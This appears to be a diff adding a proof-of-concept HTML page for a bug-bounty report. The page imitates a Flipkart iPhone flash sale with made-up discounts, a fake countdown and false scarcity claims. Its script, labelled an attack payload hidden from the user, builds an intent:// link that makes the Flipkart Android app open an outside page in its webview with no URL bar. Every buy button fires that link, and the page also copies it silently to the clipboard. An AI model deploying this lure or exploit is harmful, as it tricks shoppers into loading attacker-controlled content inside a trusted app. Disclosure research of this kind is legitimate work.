@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>Flipkart Big Billion Days — Exclusive iPhone Deals</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700;900&display=swap">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #f1f3f6; font-family: 'Roboto', Arial, sans-serif; min-height: 100vh; }
+
+/* ── TOP NAV ── */
+.nav {
+  background: #2874f0;
+  padding: 10px 16px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  position: sticky; top: 0; z-index: 100;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.25);
+}
+.nav-logo { font-size: 22px; font-weight: 900; color: #fff; font-style: italic; letter-spacing: -0.5px; }
+.nav-logo span { color: #ffe500; font-size: 10px; font-style: normal; font-weight: 400; vertical-align: super; }
+.nav-search {
+  flex: 1;
+  background: #fff;
+  border-radius: 2px;
+  padding: 8px 12px;
+  font-size: 13px;
+  color: #888;
+  display: flex; align-items: center; gap: 6px;
+}
+.nav-search-icon { color: #2874f0; font-size: 15px; }
+
+/* ── HERO BANNER ── */
+.hero {
+  background: linear-gradient(135deg, #0d1b4b 0%, #1a3a8a 50%, #0d1b4b 100%);
+  padding: 16px;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+}
+.hero-tag {
+  display: inline-block;
+  background: #ffe500;
+  color: #0d1b4b;
+  font-size: 10px;
+  font-weight: 700;
+  padding: 3px 10px;
+  border-radius: 2px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+.hero-title {
+  font-size: 24px;
+  font-weight: 900;
+  color: #fff;
+  line-height: 1.1;
+  margin-bottom: 4px;
+}
+.hero-title .accent { color: #ffe500; }
+.hero-sub { font-size: 13px; color: rgba(255,255,255,0.8); margin-bottom: 12px; }
+.hero-timer-label { font-size: 11px; color: #ffe500; letter-spacing: 1px; margin-bottom: 6px; text-transform: uppercase; }
+.timer-row { display: flex; justify-content: center; gap: 6px; margin-bottom: 14px; }
+.timer-box {
+  background: rgba(0,0,0,0.4);
+  border: 1px solid rgba(255,229,0,0.3);
+  border-radius: 4px;
+  padding: 6px 10px;
+  min-width: 48px;
+  text-align: center;
+}
+.timer-num { font-size: 22px; font-weight: 900; color: #ffe500; line-height: 1; }
+.timer-unit { font-size: 9px; color: rgba(255,255,255,0.6); text-transform: uppercase; letter-spacing: 0.5px; }
+.timer-sep { color: #ffe500; font-size: 20px; font-weight: 900; align-self: center; }
+.hero-badge-row { display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; }
+.hero-badge {
+  background: rgba(255,255,255,0.1);
+  border: 1px solid rgba(255,255,255,0.2);
+  border-radius: 20px;
+  color: #fff;
+  font-size: 10px;
+  padding: 4px 10px;
+  font-weight: 500;
+}
+
+/* ── SECTION HEADER ── */
+.section-head {
+  background: #fff;
+  padding: 12px 16px 0;
+  margin-top: 8px;
+}
+.section-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: #212121;
+  border-bottom: 3px solid #2874f0;
+  display: inline-block;
+  padding-bottom: 8px;
+}
+
+/* ── PRODUCT CARDS ── */
+.products { padding: 0 8px 8px; background: #fff; margin-top: 0; }
+.product-card {
+  background: #fff;
+  border-radius: 4px;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  border: 1px solid #f0f0f0;
+  margin: 8px 0;
+}
+.card-img-wrap {
+  background: linear-gradient(135deg, #f8f9fa, #e8ecff);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px 16px;
+  position: relative;
+}
+.card-badge {
+  position: absolute;
+  top: 10px; left: 10px;
+  background: #388e3c;
+  color: #fff;
+  font-size: 10px;
+  font-weight: 700;
+  padding: 3px 7px;
+  border-radius: 2px;
+}
+.card-badge.hot { background: #e53935; }
+.iphone-mock {
+  width: 90px; height: 160px;
+  background: linear-gradient(175deg, #1c1c1e, #2c2c2e);
+  border-radius: 18px;
+  position: relative;
+  box-shadow: 0 12px 40px rgba(0,0,0,0.35), inset 0 1px 0 rgba(255,255,255,0.12);
+  display: flex; align-items: center; justify-content: center;
+  flex-direction: column; gap: 4px;
+}
+.iphone-mock::before {
+  content: '';
+  position: absolute; top: 12px; left: 50%; transform: translateX(-50%);
+  width: 28px; height: 6px;
+  background: #000;
+  border-radius: 4px;
+}
+.iphone-screen {
+  width: 78px; height: 140px;
+  background: linear-gradient(160deg, #1e3a5f, #2874f0, #1a1a2e);
+  border-radius: 15px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 28px;
+}
+.card-body { padding: 12px 14px 14px; flex: 1; display: flex; flex-direction: column; gap: 6px; }
+.card-name { font-size: 13px; color: #212121; font-weight: 500; line-height: 1.35; }
+.card-rating { display: flex; align-items: center; gap: 4px; }
+.rating-pill {
+  background: #388e3c; color: #fff;
+  font-size: 10px; font-weight: 700;
+  padding: 2px 5px; border-radius: 2px;
+  display: flex; align-items: center; gap: 2px;
+}
+.rating-count { font-size: 10px; color: #878787; }
+.price-row { display: flex; align-items: baseline; gap: 8px; flex-wrap: wrap; }
+.price-now { font-size: 20px; font-weight: 700; color: #212121; }
+.price-was { font-size: 12px; color: #878787; text-decoration: line-through; }
+.price-off { font-size: 12px; font-weight: 600; color: #388e3c; }
+.offers-row { display: flex; gap: 6px; flex-wrap: wrap; }
+.offer-tag {
+  background: #e8f5e9;
+  color: #2e7d32;
+  font-size: 10px;
+  font-weight: 500;
+  padding: 3px 7px;
+  border-radius: 2px;
+  border: 1px solid #c8e6c9;
+}
+.offer-tag.bank { background: #e3f2fd; color: #1565c0; border-color: #bbdefb; }
+.assured {
+  display: flex; align-items: center; gap: 4px;
+  font-size: 10px; color: #2874f0; font-weight: 600;
+}
+.assured-badge {
+  background: #2874f0; color: #fff;
+  font-size: 8px; font-weight: 700;
+  padding: 2px 4px; border-radius: 1px;
+  letter-spacing: 0.5px;
+}
+.btn-buy {
+  width: 100%;
+  background: linear-gradient(to bottom, #ff9f00, #f57c00);
+  color: #fff;
+  border: none;
+  border-radius: 3px;
+  padding: 13px;
+  font-size: 14px;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  text-transform: uppercase;
+  box-shadow: 0 2px 4px rgba(245,124,0,0.4);
+  margin-top: 4px;
+}
+.btn-buy:active { filter: brightness(0.92); }
+
+/* ── FEATURED DEAL ── */
+.featured {
+  background: #fff;
+  margin-top: 8px;
+  padding: 14px 16px;
+}
+.featured-head {
+  display: flex; align-items: center; justify-content: space-between;
+  margin-bottom: 12px;
+}
+.featured-title { font-size: 16px; font-weight: 700; color: #212121; }
+.featured-see { font-size: 12px; color: #2874f0; font-weight: 600; }
+
+.deal-strip {
+  background: linear-gradient(90deg, #0d1b4b, #1a3a8a);
+  border-radius: 6px;
+  padding: 16px;
+  color: #fff;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+.deal-phone-thumb {
+  width: 64px; height: 100px;
+  background: linear-gradient(175deg, #1c1c1e, #3a3a3c);
+  border-radius: 12px;
+  flex-shrink: 0;
+  box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 20px;
+}
+.deal-content { flex: 1; min-width: 0; }
+.deal-name { font-size: 12px; font-weight: 600; color: #ffe500; margin-bottom: 2px; }
+.deal-model { font-size: 15px; font-weight: 700; margin-bottom: 8px; }
+.deal-prices { display: flex; align-items: baseline; gap: 8px; margin-bottom: 8px; flex-wrap: wrap; }
+.deal-price { font-size: 22px; font-weight: 900; }
+.deal-was { font-size: 12px; color: rgba(255,255,255,0.55); text-decoration: line-through; }
+.deal-off-badge {
+  background: #ffe500; color: #0d1b4b;
+  font-size: 11px; font-weight: 800;
+  padding: 2px 7px; border-radius: 2px;
+}
+.deal-feat { font-size: 10px; color: rgba(255,255,255,0.7); line-height: 1.6; }
+.btn-deal {
+  background: #ffe500;
+  color: #0d1b4b;
+  border: none;
+  border-radius: 3px;
+  padding: 10px 18px;
+  font-size: 13px;
+  font-weight: 800;
+  cursor: pointer;
+  white-space: nowrap;
+  flex-shrink: 0;
+  text-transform: uppercase;
+  letter-spacing: 0.3px;
+}
+
+/* ── OFFERS STRIP ── */
+.offers-strip {
+  background: #fff;
+  margin-top: 8px;
+  padding: 12px 16px;
+}
+.strip-title { font-size: 12px; font-weight: 700; color: #212121; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+.strip-items { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 4px; }
+.strip-item {
+  flex-shrink: 0;
+  background: #f8f9fa;
+  border-radius: 6px;
+  border: 1px solid #e0e0e0;
+  padding: 10px 12px;
+  min-width: 120px;
+  text-align: center;
+}
+.strip-icon { font-size: 20px; margin-bottom: 4px; }
+.strip-label { font-size: 10px; font-weight: 600; color: #212121; }
+.strip-sub { font-size: 9px; color: #878787; margin-top: 1px; }
+
+/* ── DISCLAIMER ── */
+.disclaimer {
+  background: #fff;
+  margin-top: 8px;
+  padding: 10px 16px;
+  font-size: 9px;
+  color: #b0b0b0;
+  line-height: 1.6;
+}
+
+/* ── FOOTER ── */
+.footer {
+  background: #172337;
+  color: rgba(255,255,255,0.6);
+  padding: 16px;
+  margin-top: 8px;
+  font-size: 10px;
+  line-height: 1.7;
+}
+.footer-logo { font-size: 18px; font-weight: 900; color: #fff; font-style: italic; margin-bottom: 8px; }
+
+/* ── TOAST ── */
+.toast {
+  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+  background: #323232; color: #fff;
+  padding: 12px 20px; border-radius: 4px;
+  font-size: 13px; font-weight: 500;
+  z-index: 9999; opacity: 0;
+  transition: opacity 0.3s;
+  white-space: nowrap;
+  max-width: 90vw;
+}
+.toast.show { opacity: 1; }
+
+/* ── BOTTOM CTA ── */
+.bottom-cta {
+  position: sticky; bottom: 0;
+  background: #fff;
+  padding: 10px 16px;
+  box-shadow: 0 -2px 8px rgba(0,0,0,0.12);
+  display: flex; gap: 10px;
+  z-index: 50;
+}
+.btn-cart {
+  flex: 1;
+  background: #fff;
+  color: #ff9f00;
+  border: 2px solid #ff9f00;
+  border-radius: 3px;
+  padding: 12px;
+  font-size: 13px;
+  font-weight: 700;
+  text-transform: uppercase;
+  cursor: pointer;
+}
+.btn-buy-now {
+  flex: 1.4;
+  background: linear-gradient(to bottom, #fb641b, #d84315);
+  color: #fff;
+  border: none;
+  border-radius: 3px;
+  padding: 12px;
+  font-size: 14px;
+  font-weight: 700;
+  text-transform: uppercase;
+  cursor: pointer;
+  letter-spacing: 0.3px;
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<div class="nav">
+  <div class="nav-logo">Flipkart <span>Plus</span></div>
+  <div class="nav-search">
+    <span class="nav-search-icon">🔍</span>
+    Search for products, brands and more
+  </div>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">⚡ Limited Time — Flash Sale</div>
+  <div class="hero-title"><span class="accent">50% OFF</span> on All iPhones</div>
+  <p class="hero-sub">Guaranteed lowest price — only on Flipkart App</p>
+  <div class="hero-timer-label">⏰ Sale ends in</div>
+  <div class="timer-row">
+    <div class="timer-box"><div class="timer-num" id="th">02</div><div class="timer-unit">Hrs</div></div>
+    <div class="timer-sep">:</div>
+    <div class="timer-box"><div class="timer-num" id="tm">47</div><div class="timer-unit">Min</div></div>
+    <div class="timer-sep">:</div>
+    <div class="timer-box"><div class="timer-num" id="ts">33</div><div class="timer-unit">Sec</div></div>
+  </div>
+  <div class="hero-badge-row">
+    <span class="hero-badge">✅ No Cost EMI</span>
+    <span class="hero-badge">🎁 Exchange offer up to ₹18,000</span>
+    <span class="hero-badge">🏦 Extra 10% off on SBI Cards</span>
+  </div>
+</div>
+
+<!-- OFFERS STRIP -->
+<div class="offers-strip">
+  <div class="strip-title">Why buy from Flipkart?</div>
+  <div class="strip-items">
+    <div class="strip-item"><div class="strip-icon">🚚</div><div class="strip-label">Free Delivery</div><div class="strip-sub">All orders</div></div>
+    <div class="strip-item"><div class="strip-icon">🔄</div><div class="strip-label">7-Day Return</div><div class="strip-sub">No questions asked</div></div>
+    <div class="strip-item"><div class="strip-icon">🛡️</div><div class="strip-label">1-Yr Warranty</div><div class="strip-sub">Apple certified</div></div>
+    <div class="strip-item"><div class="strip-icon">💳</div><div class="strip-label">No Cost EMI</div><div class="strip-sub">₹4,167/mo</div></div>
+    <div class="strip-item"><div class="strip-icon">🏷️</div><div class="strip-label">Price Match</div><div class="strip-sub">Lowest guaranteed</div></div>
+  </div>
+</div>
+
+<!-- FEATURED DEAL -->
+<div class="featured">
+  <div class="featured-head">
+    <div class="featured-title">🏆 Today's Best Deal</div>
+    <div class="featured-see">See all →</div>
+  </div>
+  <div class="deal-strip">
+    <div class="deal-phone-thumb">📱</div>
+    <div class="deal-content">
+      <div class="deal-name">EXCLUSIVE OFFER</div>
+      <div class="deal-model">iPhone 17 — 256 GB</div>
+      <div class="deal-prices">
+        <span class="deal-price">₹50,000</span>
+        <span class="deal-was">₹1,19,900</span>
+        <span class="deal-off-badge">58% OFF</span>
+      </div>
+      <div class="deal-feat">
+        ✔ Midnight Black · 256 GB<br>
+        ✔ Extra ₹5,000 off with HDFC Card<br>
+        ✔ Only 3 units left!
+      </div>
+    </div>
+    <button class="btn-deal" onclick="openInApp()">BUY IN APP</button>
+  </div>
+</div>
+
+<!-- PRODUCTS -->
+<div class="section-head">
+  <div class="section-title">All iPhone Deals — 50% Off</div>
+</div>
+<div class="products">
+
+  <!-- Card 1 -->
+  <div class="product-card">
+    <div class="card-img-wrap">
+      <div class="card-badge hot">HOT 🔥</div>
+      <div class="iphone-mock"><div class="iphone-screen">📱</div></div>
+    </div>
+    <div class="card-body">
+      <div class="card-name">Apple iPhone 17 (Midnight Black, 256 GB)</div>
+      <div class="card-rating">
+        <div class="rating-pill">★ 4.8</div>
+        <div class="rating-count">1,24,381 ratings</div>
+      </div>
+      <div class="price-row">
+        <span class="price-now">₹50,000</span>
+        <span class="price-was">₹1,19,900</span>
+        <span class="price-off">58% off</span>
+      </div>
+      <div class="offers-row">
+        <div class="offer-tag">✅ Free Delivery</div>
+        <div class="offer-tag bank">🏦 Extra 10% SBI</div>
+        <div class="offer-tag">🎁 Exchange ₹18k</div>
+      </div>
+      <div class="assured"><span class="assured-badge">FLIPKART</span> Assured ⚡ In stock</div>
+      <button class="btn-buy" onclick="openInApp()">🛒 BUY NOW — GRAB 58% OFF</button>
+    </div>
+  </div>
+
+  <!-- Card 2 -->
+  <div class="product-card">
+    <div class="card-img-wrap">
+      <div class="card-badge">50% OFF</div>
+      <div class="iphone-mock" style="background:linear-gradient(175deg,#1a2a1a,#2a3a2a)"><div class="iphone-screen" style="background:linear-gradient(160deg,#1a3a1f,#2e7d32,#1a1a2e)">📱</div></div>
+    </div>
+    <div class="card-body">
+      <div class="card-name">Apple iPhone 17 (Alpine Green, 128 GB)</div>
+      <div class="card-rating">
+        <div class="rating-pill">★ 4.7</div>
+        <div class="rating-count">98,210 ratings</div>
+      </div>
+      <div class="price-row">
+        <span class="price-now">₹44,900</span>
+        <span class="price-was">₹89,900</span>
+        <span class="price-off">50% off</span>
+      </div>
+      <div class="offers-row">
+        <div class="offer-tag">✅ Free Delivery</div>
+        <div class="offer-tag bank">🏦 Extra 10% ICICI</div>
+      </div>
+      <div class="assured"><span class="assured-badge">FLIPKART</span> Assured ⚡ In stock</div>
+      <button class="btn-buy" onclick="openInApp()">🛒 BUY NOW — GRAB 50% OFF</button>
+    </div>
+  </div>
+
+  <!-- Card 3 -->
+  <div class="product-card">
+    <div class="card-img-wrap">
+      <div class="card-badge">52% OFF</div>
+      <div class="iphone-mock" style="background:linear-gradient(175deg,#2a1a1a,#3a2a2a)"><div class="iphone-screen" style="background:linear-gradient(160deg,#3a1a1a,#b71c1c,#1a1a2e)">📱</div></div>
+    </div>
+    <div class="card-body">
+      <div class="card-name">Apple iPhone 16 Pro Max (Desert Titanium, 256 GB)</div>
+      <div class="card-rating">
+        <div class="rating-pill">★ 4.9</div>
+        <div class="rating-count">2,10,004 ratings</div>
+      </div>
+      <div class="price-row">
+        <span class="price-now">₹57,499</span>
+        <span class="price-was">₹1,19,900</span>
+        <span class="price-off">52% off</span>
+      </div>
+      <div class="offers-row">
+        <div class="offer-tag">✅ Free Delivery</div>
+        <div class="offer-tag bank">🏦 Extra 12% Axis</div>
+        <div class="offer-tag">🎁 Exchange ₹22k</div>
+      </div>
+      <div class="assured"><span class="assured-badge">FLIPKART</span> Assured ⚡ Only 2 left!</div>
+      <button class="btn-buy" onclick="openInApp()">🛒 BUY NOW — GRAB 52% OFF</button>
+    </div>
+  </div>
+
+</div>
+
+<!-- DISCLAIMER -->
+<div class="disclaimer">
+  *Prices shown are inclusive of all taxes. Offers valid while stocks last. Bank offer valid on select cards only.
+  Exchange value may vary based on device condition. Flipkart reserves the right to modify/cancel offers without notice.
+  FK2 VRP Security Research — ankikanojiya27@gmail.com
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  <div class="footer-logo">Flipkart</div>
+  About Us &nbsp;·&nbsp; Press &nbsp;·&nbsp; Jobs &nbsp;·&nbsp; Investor Relations<br>
+  Payments &nbsp;·&nbsp; Shipping &nbsp;·&nbsp; Cancellation & Returns<br>
+  FAQs &nbsp;·&nbsp; Infrastructure &nbsp;·&nbsp; Sitemap<br><br>
+  © 2007–2025 Flipkart.com
+</div>
+
+<!-- BOTTOM STICKY CTA -->
+<div class="bottom-cta">
+  <button class="btn-cart" onclick="openInApp()">ADD TO CART</button>
+  <button class="btn-buy-now" onclick="openInApp()">BUY NOW ON APP</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ── FK2 VRP — ATTACK PAYLOAD (hidden from user) ────────────────────────────
+var PHISHING_URL = "https://httpbin.org/redirect-to?url=" +
+  encodeURIComponent("https://ankitkanojiy.github.io/test_page/fk2_poc.html") +
+  "&status_code=302";
+
+var actionKey = JSON.stringify({
+  screenType: "webView",
+  params: { url: PHISHING_URL }
+});
+
+// intent:// URI — fires HomeFragmentHolderActivity with ACTION_KEY extra
+// webView.postUrl() → httpbin 302 → attacker HTML inside Flipkart, no URL bar
+var intentUrl = "intent://unused#Intent;" +
+  "scheme=flipkart;" +
+  "package=com.flipkart.android;" +
+  "action=android.intent.action.VIEW;" +
+  "category=android.intent.category.BROWSABLE;" +
+  "S.ACTION_KEY=" + encodeURIComponent(actionKey) + ";" +
+  "end;";
+// ──────────────────────────────────────────────────────────────────────────
+
+function showToast(msg, dur) {
+  var t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(function() { t.classList.remove('show'); }, dur || 3000);
+}
+
+function openInApp() {
+  // Step 1: try direct intent navigation (works in some Chrome versions/configs)
+  try { window.location.href = intentUrl; } catch(e) {}
+
+  // Step 2: simultaneously copy to clipboard as reliable fallback
+  // (Chrome address bar surfaces intent:// clipboard URLs as "Open in Flipkart" suggestion)
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(intentUrl).then(function() {
+      showToast('Opening Flipkart... if not opened, tap address bar ↑', 4000);
+    }).catch(copyFallback);
+  } else {
+    copyFallback();
+  }
+}
+
+function copyFallback() {
+  var ta = document.createElement('textarea');
+  ta.value = intentUrl;
+  ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0';
+  document.body.appendChild(ta);
+  ta.focus(); ta.select();
+  try { document.execCommand('copy'); } catch(e) {}
+  document.body.removeChild(ta);
+  showToast('Tap your browser address bar to open in Flipkart app', 4000);
+}
+
+// ── COUNTDOWN TIMER ───────────────────────────────────────────────────────
+var secs = 2 * 3600 + 47 * 60 + 33;
+function tick() {
+  if (secs <= 0) return;
+  secs--;
+  var h = Math.floor(secs / 3600);
+  var m = Math.floor((secs % 3600) / 60);
+  var s = secs % 60;
+  document.getElementById('th').textContent = String(h).padStart(2,'0');
+  document.getElementById('tm').textContent = String(m).padStart(2,'0');
+  document.getElementById('ts').textContent = String(s).padStart(2,'0');
+}
+setInterval(tick, 1000);
+</script>
+</body>
+</html>
